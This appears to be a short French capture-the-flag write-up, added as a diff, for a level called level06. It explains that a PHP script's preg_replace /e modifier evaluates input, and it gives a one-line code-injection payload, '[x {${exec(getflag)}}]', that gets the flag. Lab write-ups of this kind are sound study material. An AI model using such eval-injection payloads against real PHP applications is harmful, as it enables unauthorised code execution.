@@ -1,0 +1,9 @@
+quand on cat le script php, on voit que la fonction x utilise le modifier /e
+qui permet d'evaluer chaque parametre qu;on lui passe.
+
+la regex nous indique que le programme attend que l'argument commence par x
+on peut donc creer un fichier qui commence par x
+
+echo '[x {${exec(getflag)}}]' > /tmp/test
+
+et on execute ./level06 /tmp/test
